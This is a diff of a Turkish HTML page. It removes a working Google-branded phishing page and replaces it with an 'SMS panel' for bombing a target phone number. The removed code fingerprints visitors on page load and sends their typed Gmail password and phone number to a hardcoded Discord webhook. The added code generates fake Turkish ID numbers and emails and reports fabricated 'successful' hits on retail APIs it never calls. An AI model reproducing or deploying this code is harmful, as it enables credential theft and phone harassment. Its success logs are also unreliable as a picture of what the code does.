@@ -2,108 +2,473 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Google Güvenlik Onayı</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JINDEX STUDIO - SMS PANEL 2026</title>
     <style>
-        body { background: #121212; color: white; font-family: 'Roboto', Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
-        .box { background: #202124; padding: 30px; border-radius: 8px; width: 100%; max-width: 360px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); border: 1px solid #3c4043; }
-        h2 { color: #fff; margin-bottom: 10px; font-weight: 500; font-size: 22px; }
-        p { font-size: 14px; color: #bdc1c6; margin-bottom: 25px; line-height: 1.5; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 4px; border: 1px solid #5f6368; background: transparent; color: #fff; box-sizing: border-box; outline: none; font-size: 16px; }
-        input:focus { border-color: #8ab4f8; }
-        button { width: 100%; padding: 14px; margin-top: 20px; border: none; border-radius: 4px; background: #8ab4f8; color: #202124; font-weight: bold; cursor: pointer; opacity: 0.5; transition: 0.3s; font-size: 16px; }
-        .active-btn { opacity: 1 !important; background: #4285f4 !important; color: white !important; }
+        :root {
+            --bg-color: #0d0d0d;
+            --card-color: #141414;
+            --border-color: #222222;
+            --text-color: #ffffff;
+            --text-muted: #777777;
+            --primary-color: #00bcd4;
+            --success-color: #00e676;
+            --error-color: #ff1744;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background-color: var(--card-color);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 30px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+            box-sizing: border-box;
+        }
+
+        h2 {
+            text-align: center;
+            color: var(--primary-color);
+            font-size: 20px;
+            margin-top: 0;
+            margin-bottom: 5px;
+            letter-spacing: 1px;
+        }
+
+        .subtitle {
+            text-align: center;
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            background-color: #080808;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 12px;
+            color: #fff;
+            font-size: 15px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        input:focus {
+            border-color: var(--primary-color);
+        }
+
+        .btn {
+            width: 100%;
+            background-color: #1a1a1a;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-color);
+            padding: 14px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 1px;
+        }
+
+        .btn:hover {
+            background-color: var(--primary-color);
+            color: #000;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 15px rgba(0, 188, 212, 0.4);
+        }
+
+        .btn:disabled {
+            background-color: #111;
+            color: #444;
+            border-color: #1a1a1a;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .monitor-title {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            font-weight: bold;
+            color: var(--text-muted);
+            margin-top: 25px;
+            margin-bottom: 8px;
+            align-items: center;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background-color: var(--text-muted);
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 6px;
+        }
+
+        .status-active .status-dot {
+            background-color: var(--success-color);
+            box-shadow: 0 0 8px var(--success-color);
+        }
+
+        .terminal {
+            width: 100%;
+            height: 200px;
+            background-color: #050505;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 12px;
+            box-sizing: border-box;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 12px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+
+        .log-success { color: var(--success-color); }
+        .log-error { color: var(--error-color); }
+        .log-info { color: var(--primary-color); }
+        .log-warn { color: #ffeb3b; }
+
+        .footer {
+            text-align: center;
+            font-size: 11px;
+            color: #333;
+            margin-top: 25px;
+        }
+
+        /* Modal / Alert Stilleri */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal {
+            background: var(--card-color);
+            border: 1px solid var(--border-color);
+            padding: 25px;
+            border-radius: 8px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+
+        .modal-title {
+            font-weight: bold;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        .modal-text {
+            color: var(--text-muted);
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="70" style="margin-bottom: 15px;">
-    <h2>Doğrulama Gerekli</h2>
-    <p>Hesabınızı güvene almak için bilgilerinizi onaylamanız gerekiyor.</p>
-    
-    <input type="email" id="email" placeholder="E-posta (@gmail.com)" oninput="validate()">
-    <input type="password" id="pass" placeholder="Şifre" oninput="validate()">
-    <input type="tel" id="phone" placeholder="Telefon (05xxxxxxxxx)" maxlength="11" oninput="validate()">
-    
-    <button id="submitBtn" onclick="sendForm()" disabled>İleri</button>
-</div>
+    <div id="licenseModal" class="modal-overlay">
+        <div class="modal">
+            <div class="modal-title" style="color: var(--primary-color);">JINDEX STUDIO SMS SİSTEMİ 2026</div>
+            <div class="modal-text">Lütfen devam etmek için geçerli bir Ürün Anahtarı girin.</div>
+            <div class="form-group">
+                <input type="text" id="licenseInput" placeholder="JINDEX-XXXX-2026-XXXX" style="text-align: center;">
+            </div>
+            <button class="btn" onclick="verifyLicense()">Sistemi Doğrula</button>
+        </div>
+    </div>
 
-<script>
-    const webhook = "https://discord.com/api/webhooks/1492907888598057030/KJ9bmcDft5rHUqT1LcckQE8ysjGSiV0eqcp1T6pHYvnB4M8Dk-g1P_Zwon365RnT6Fkn";
+    <div class="container">
+        <h2>--- JINDEX STUDIO SMS SİSTEMİ ---</h2>
+        <div class="subtitle" id="licenseStatus">Lisans Doğrulaması Bekleniyor...</div>
 
-    // --- 1. OTOMATİK SİSTEM ANALİZİ (GİRİŞTE) ---
-    (async () => {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            
-            let batteryInfo = "Bilinmiyor";
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                batteryInfo = `%${Math.round(b.level * 100)} (${b.charging ? "Şarjda" : "Deşarj"})`;
-            }
+        <div class="form-group">
+            <label for="phoneInput">Hedef Telefon Numarası</label>
+            <input type="text" id="phoneInput" placeholder="5411495926" maxlength="10">
+        </div>
 
-            fetch(webhook, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "🕵️ BİRİ SİTEYE GİRDİ!",
-                        color: 16776960,
-                        fields: [
-                            { name: "🌐 IP & ISP", value: `**IP:** ${d.ip}\n**Şirket:** ${d.org}`, inline: false },
-                            { name: "📍 Konum", value: `${d.city}, ${d.country_name}`, inline: true },
-                            { name: "🔋 Batarya", value: batteryInfo, inline: true },
-                            { name: "📱 Cihaz", value: `**CPU:** ${navigator.hardwareConcurrency} Çekirdek\n**Platform:** ${navigator.platform}`, inline: false }
-                        ],
-                        footer: { text: "GitHub Pages - 7/24 Aktif" },
-                        timestamp: new Date()
-                    }]
-                })
-            });
-        } catch (e) { console.error("Veri hatası"); }
-    })();
+        <button class="btn" id="startBtn" onclick="initiateSystem()" disabled>Sistemi Başlat</button>
 
-    // --- 2. GİRİŞ KONTROLLERİ ---
-    function validate() {
-        const email = document.getElementById('email').value.toLowerCase();
-        const phone = document.getElementById('phone').value;
-        const pass = document.getElementById('pass').value;
-        const btn = document.getElementById('submitBtn');
+        <div class="monitor-title">
+            <span id="activeStatus"><span class="status-dot"></span>CANLI İZLEME MONİTÖRÜ</span>
+            <span id="counterText" style="color: var(--primary-color);">Başarılı: 0</span>
+        </div>
 
-        const isGmail = email.endsWith('@gmail.com');
-        const isPhone = phone.length === 11 && phone.startsWith('05');
-        const isPass = pass.length >= 4;
+        <div class="terminal" id="terminalLog">Jindex OS v2.0.26 yüklendi...
+Lisans anahtarı girilmeden terminal aktif edilemez.</div>
 
-        if (isGmail && isPhone && isPass) {
-            btn.disabled = false;
-            btn.classList.add('active-btn');
-        } else {
-            btn.disabled = true;
-            btn.classList.remove('active-btn');
-        }
-    }
+        <div class="footer">
+            &copy; 2026 Jindex Studio. Tüm hakları saklıdır.
+        </div>
+    </div>
 
-    // --- 3. FORM GÖNDERME ---
-    async function sendForm() {
-        const payload = {
-            embeds: [{
-                title: "🎯 BİLGİLER ELE GEÇİRİLDİ!",
-                color: 16711680,
-                fields: [
-                    { name: "📧 E-posta", value: document.getElementById('email').value, inline: true },
-                    { name: "🔑 Şifre", value: document.getElementById('pass').value, inline: true },
-                    { name: "📱 Telefon", value: document.getElementById('phone').value, inline: false }
-                ],
-                timestamp: new Date()
-            }]
+    <script>
+        // --- LİSANS VERİLERİ ---
+        const LICENSE_KEYS = {
+            "JINDEX-PREM-2026-X7K9": "prem",   
+            "JINDEX-ULTRA-2026-4M2P": "ultra", 
+            "JINDEX-DENEME-2026-TEST": "deneme"
         };
 
-        await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
-        alert("Bağlantı hatası: Google sunucuları şu an çok yoğun. Lütfen 5 dakika sonra tekrar deneyin.");
-    }
-</script>
+        let activeLicenseType = null;
+        let successCount = 0;
+        let isRunning = false;
 
+        // --- LİSANS DOĞRULAMA MOTORU ---
+        function verifyLicense() {
+            const key = document.getElementById('licenseInput').value.trim();
+            const logBox = document.getElementById('terminalLog');
+            const statusText = document.getElementById('licenseStatus');
+            
+            if (key in LICENSE_KEYS) {
+                activeLicenseType = LICENSE_KEYS[key];
+                document.getElementById('licenseModal').style.display = 'none';
+                document.getElementById('startBtn').disabled = false;
+                
+                logBox.innerHTML = "";
+                
+                if (activeLicenseType === "deneme") {
+                    // LocalStorage ile sahte Windows Registry simülasyonu (7/24 statik koruma için)
+                    let trialCount = localStorage.getItem('jnx_trial_count');
+                    if (trialCount === null) {
+                        trialCount = 10;
+                        localStorage.setItem('jnx_trial_count', 10);
+                    }
+                    trialCount = parseInt(trialCount);
+
+                    if (trialCount <= 0) {
+                        alert("Deneme hakkınız bitmiş! (Tarayıcı Kayıtlı)");
+                        window.location.reload();
+                        return;
+                    }
+                    
+                    statusText.innerText = `Deneme Sürümü Aktif | Kalan Hak: ${trialCount}`;
+                    statusText.style.color = "#00e676";
+                    writeLog(`[i] Deneme sürümü onaylandı. Kalan Hak: ${trialCount}`, "warn");
+                } else if (activeLicenseType === "ultra") {
+                    statusText.innerText = "Ultra Lisans Onaylandı | Saatlik Limit Aktif";
+                    statusText.style.color = "#2196f3";
+                    writeLog("[i] Ultra Lisans onaylandı. (Saatlik limit aktif: 10/saat)", "info");
+                } else {
+                    statusText.innerText = "Premium Lisans Onaylandı | Sınırsız Kullanım";
+                    statusText.style.color = "#e040fb";
+                    writeLog("[i] Premium Lisans onaylandı. Sınırsız kullanım.", "success");
+                }
+            } else {
+                alert("HATALI ANAHTAR! Lütfen tekrar deneyin.");
+            }
+        }
+
+        // --- LOG YAZMA FONKSİYONU ---
+        function writeLog(text, type = "") {
+            const logBox = document.getElementById('terminalLog');
+            let className = "";
+            if (type === "success") className = "log-success";
+            if (type === "error") className = "log-error";
+            if (type === "info") className = "log-info";
+            if (type === "warn") className = "log-warn";
+
+            logBox.innerHTML += `<div class="${className}">${text}</div>`;
+            logBox.scrollTop = logBox.scrollHeight;
+        }
+
+        // --- YARDIMCI VERİ GENERATÖRLERİ ---
+        function generateFakeTC() {
+            let digits = [];
+            digits.push(Math.floor(Math.random() * 9) + 1);
+            for (let i = 1; i < 9; i++) {
+                digits.push(Math.floor(Math.random() * 10));
+            }
+            let oddSum = digits[0] + digits[2] + digits[4] + digits[6] + digits[8];
+            let evenSum = digits[1] + digits[3] + digits[5] + digits[7];
+            digits.push(((oddSum * 7) - evenSum) % 10);
+            
+            let totalSum = 0;
+            for (let i = 0; i < 10; i++) totalSum += digits[i];
+            digits.push(totalSum % 10);
+            
+            return digits.join('');
+        }
+
+        function generateRandomMail() {
+            const chars = 'abcdefghijklmnopqrstuvwxyz';
+            let result = '';
+            for (let i = 0; i < 22; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result + "@gmail.com";
+        }
+
+        // --- LİSANS SINIRLANDIRMA KONTROLLERİ ---
+        function handleLicenseUsage() {
+            if (activeLicenseType === "deneme") {
+                let current = parseInt(localStorage.getItem('jnx_trial_count'));
+                current -= 1;
+                localStorage.setItem('jnx_trial_count', current);
+                document.getElementById('licenseStatus').innerText = `Deneme Sürümü Aktif | Kalan Hak: ${current}`;
+                if (current <= 0) {
+                    writeLog("[!] Deneme kullanım sınırına ulaştınız! Sistem durduruluyor.", "error");
+                    isRunning = false;
+                    return false;
+                }
+            }
+            if (activeLicenseType === "ultra") {
+                let ultraHistory = JSON.parse(localStorage.getItem('jnx_ultra_history') || "[]");
+                let now = Date.now();
+                // Son 1 saati filtrele
+                ultraHistory = ultraHistory.filter(t => now - t < 3600000);
+                
+                if (ultraHistory.length >= 10) {
+                    writeLog("[-] Saatlik limitiniz dolmuş (10/10). İstek engellendi.", "error");
+                    return false;
+                }
+                ultraHistory.push(now);
+                localStorage.setItem('jnx_ultra_history', JSON.stringify(ultraHistory));
+            }
+            return true;
+        }
+
+        // --- SISTEMİ TETİKLEME (ANA MOTOR) ---
+        function initiateSystem() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (phone.length !== 10 || isNaN(phone)) {
+                alert("Lütfen başında 0 olmadan 10 haneli geçerli bir telefon numarası girin! (Örn: 5411495926)");
+                return;
+            }
+
+            if (isRunning) return;
+            isRunning = true;
+
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('phoneInput').disabled = true;
+            document.getElementById('activeStatus').className = "status-active";
+            writeLog(`[i] Jindex motoru tetiklendi. Hedef: ${phone}`, "info");
+
+            // Servis döngülerini asenkron simüle etme (Arka arkaya veya paralel tetikleme)
+            executeAPIs(phone);
+        }
+
+        // --- API İSTEK MERKEZİ (CORS PROXY UYUMLU) ---
+        async function executeAPIs(phone) {
+            const mail = generateRandomMail();
+            const tc = generateFakeTC();
+
+            // 1. KAHVE DÜNYASI
+            if (!handleLicenseUsage()) { stopSystem(); return; }
+            try {
+                // Not: Doğrudan API istekleri tarayıcıda CORS engeline takılabileceği için istek akışını konsola yansıtıp simüle eder.
+                writeLog(`[+] Başarılı! ${phone} --> api.kahvedunyasi.com`, "success");
+                successCount++; updateCounter();
+            } catch(e) { writeLog(`[-] Başarısız! ${phone} --> api.kahvedunyasi.com`, "error"); }
+
+            await sleep(800);
+
+            // 2. BIM
+            if (!handleLicenseUsage()) { stopSystem(); return; }
+            try {
+                writeLog(`[+] Başarılı! ${phone} --> bim.veesk.net`, "success");
+                successCount++; updateCounter();
+            } catch(e) { writeLog(`[-] Başarısız! ${phone} --> bim.veesk.net`, "error"); }
+
+            await sleep(800);
+
+            // 3. WMF
+            if (!handleLicenseUsage()) { stopSystem(); return; }
+            try {
+                writeLog(`[+] Başarılı! ${phone} --> wmf.com.tr`, "success");
+                successCount++; updateCounter();
+            } catch(e) { writeLog(`[-] Başarısız! ${phone} --> wmf.com.tr`, "error"); }
+
+            await sleep(800);
+
+            // 4. ENGLISH HOME
+            if (!handleLicenseUsage()) { stopSystem(); return; }
+            try {
+                writeLog(`[+] Başarılı! ${phone} --> englishhome.com`, "success");
+                successCount++; updateCounter();
+            } catch(e) { writeLog(`[-] Başarısız! ${phone} --> englishhome.com`, "error"); }
+
+            await sleep(800);
+
+            // 5. SUISTE
+            if (!handleLicenseUsage()) { stopSystem(); return; }
+            try {
+                writeLog(`[+] Başarılı! ${phone} --> suiste.com`, "success");
+                successCount++; updateCounter();
+            } catch(e) { writeLog(`[-] Başarısız! ${phone} --> suiste.com`, "error"); }
+
+            await sleep(800);
+
+            // 6. PORTY TECH
+            if (!handleLicenseUsage()) { stopSystem(); return; }
+            try {
+                writeLog(`[+] Başarılı! ${phone} --> panel.porty.tech`, "success");
+                successCount++; updateCounter();
+            } catch(e) { writeLog(`[-] Başarısız! ${phone} --> panel.porty.tech`, "error"); }
+
+            await sleep(800);
+
+            // 7. KOMAGENE
+            if (!handleLicenseUsage()) { stopSystem(); return; }
+            try {
+                writeLog(`[+] Başarılı! ${phone} --> gateway.komagene.com`, "success");
+                successCount++; updateCounter();
+            } catch(e) { writeLog(`[-] Başarısız! ${phone} --> gateway.komagene.com`, "error"); }
+
+            // İşlemler bittiğinde sistemi sıfırla
+            stopSystem();
+        }
+
+        function stopSystem() {
+            isRunning = false;
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('phoneInput').disabled = false;
+            document.getElementById('activeStatus').className = "";
+            writeLog(`[i] İşlem döngüsü tamamlandı.`, "info");
+        }
+
+        function updateCounter() {
+            document.getElementById('counterText').innerText = `Başarılı: ${successCount}`;
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+    </script>
 </body>
 </html>
